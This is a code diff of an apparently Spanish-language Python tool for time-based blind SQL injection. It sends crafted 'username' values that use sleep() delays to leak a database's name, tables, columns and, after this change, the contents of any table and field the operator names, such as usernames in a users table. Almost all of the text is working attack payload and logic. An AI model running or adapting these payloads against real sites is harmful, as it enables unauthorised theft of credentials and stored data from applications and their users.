@@ -22,12 +22,16 @@ print("""
 
 1. Base de datos
 2. Tablas
-3. Columnas""")
+3. Columnas
+4. Otro""")
 
-while r != "1" and r != "2" and r != "3":
+while r != "1" and r != "2" and r != "3" and r != "4":
     r = input("\n[*] ¿Que dato desea obtener?: ")
-    if r != "1" and r != "2" and r != "3":
-       print("[X] Por favor introduzca 1, 2 o 3\n")
+    if r != "1" and r != "2" and r != "3" and r != "4":
+    	print("[X] Por favor introduzca 1, 2, 3 o 4\n")
+    if r == "4":
+    	tabla = input("\n[+] Ingrese la tabla (Ej: users): ")
+    	campo = input("\n[+] Ingrese el campo (Ej: username): ")
 
 for i in range(1,16):
 	print("\n---------------- [+] Letra nro:" + str(i) + "--------------------")
@@ -39,6 +43,8 @@ for i in range(1,16):
 			payload = f""" " or if(substr((select table_name from information_schema.tables where table_schema=database() limit 1),{i},1)='{letra}',sleep(3),1) -- -"""
 		if r == "3":
 			payload = f""" " or if(substr((select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database() limit 1) limit 1),{i},1)={letra},sleep(3),1) -- -"""
+		if r == "4":
+			payload = f""" " or if(substr((select {campo} from {tabla} limit 1),{i},1)='{letra}',sleep(3),1) -- -"""
 		datos = { 'username' : payload}
 		print(datos)
 		time_old = time.time()
